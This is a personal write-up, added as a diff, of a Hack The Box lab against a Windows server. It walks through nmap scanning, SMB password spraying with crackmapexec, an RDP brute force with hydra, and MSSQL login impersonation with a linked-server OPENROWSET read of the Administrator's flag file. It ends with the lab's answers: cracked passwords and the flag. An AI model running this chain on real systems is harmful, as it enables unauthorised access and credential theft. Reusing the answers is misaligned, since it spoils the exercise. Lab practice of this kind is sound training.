@@ -1,1 +1,90 @@
+The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know.
+
+
+for this one there are 4 questions, ill probably just list all my steps under question one then split them out cool story buck i know. 
+
+Question 1 - What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)
+
+1) sudo nmap -sCV -A 10.129.203.10
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 15:23 CST
+Nmap scan report for 10.129.203.10
+Host is up (0.010s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.129.203.10:1433: 
+|     Target_Name: WIN-HARD
+|     NetBIOS_Domain_Name: WIN-HARD
+|     NetBIOS_Computer_Name: WIN-HARD
+|     DNS_Domain_Name: WIN-HARD
+|     DNS_Computer_Name: WIN-HARD
+|_    Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-02-01T21:22:25
+|_Not valid after:  2055-02-01T21:22:25
+|_ssl-date: 2025-02-01T21:26:32+00:00; +1m39s from scanner time.
+| ms-sql-info: 
+|   10.129.203.10:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WIN-HARD
+|   NetBIOS_Domain_Name: WIN-HARD
+|   NetBIOS_Computer_Name: WIN-HARD
+|   DNS_Domain_Name: WIN-HARD
+|   DNS_Computer_Name: WIN-HARD
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-02-01T21:25:52+00:00
+| ssl-cert: Subject: commonName=WIN-HARD
+| Not valid before: 2025-01-31T21:22:13
+|_Not valid after:  2025-08-02T21:22:13
+|_ssl-date: 2025-02-01T21:26:32+00:00; +1m39s from scanner time.
+
+k so gross microsoft.. 
+
+2) since were looking for a file for simo nand we know smb is open lets try this crackmapexec smb 10.129.203.10 -u simon -p pass list --local-auth 
+3) we get password match simon:liverpool 
+4) smbclient -U simon //10.129.203.10/home
+5) dir 
+6) cd IT 
+7) dir - we get the two other people in here john and fiona 
+8) cd to Simons directory to get first answer - random.txt -> also use get to download incase we need 
+9) we also go into fiona's directory and johns and get all their text files
+10) go to host machine and review findings 
+11) so lets jsut mess with fiona rn and her creds.txt -> hydra -l fiona -P creds.txt 10.129.203.10 rdp
+12) fiona:48Ns72!bns74@S84NNNSl
+13) xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl'
+14) open commandline inside RDP session 
+15) sqlcmd -> in the command line -> had to look these up cause i have never used sqlcmd 
+16) EXECUTE AS LOGIN = 'john';  
+SELECT SYSTEM_USER;  
+SELECT IS_SRVROLEMEMBER('sysadmin');  
+go  
+17) to read the file -
+SELECT srvname, isremote FROM sysservers;  
+go  
+EXECUTE('SELECT @@servername, @@version, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [local.test.linked.srv];  
+go  
+execute ('select * from OPENROWSET(BULK ''C:/Users/Administrator/desktop/flag.txt'', SINGLE_CLOB) AS Contents') at [local.test.linked.srv];  
+go 
+HTB{46u$!n9_l!nk3d_$3rv3r$}
+
+
+Question 2 - Enumerate the target and find a password for the user Fiona. What is her password? - 48Ns72!bns74@S84NNNSl
+
+
+Question 3 - Once logged in, what other user can we compromise to gain admin privileges? - john
+
+
+
+Question 4 - Submit the contents of the flag.txt file on the Administrator Desktop. - HTB{46u$!n9_l!nk3d_$3rv3r$} 
 
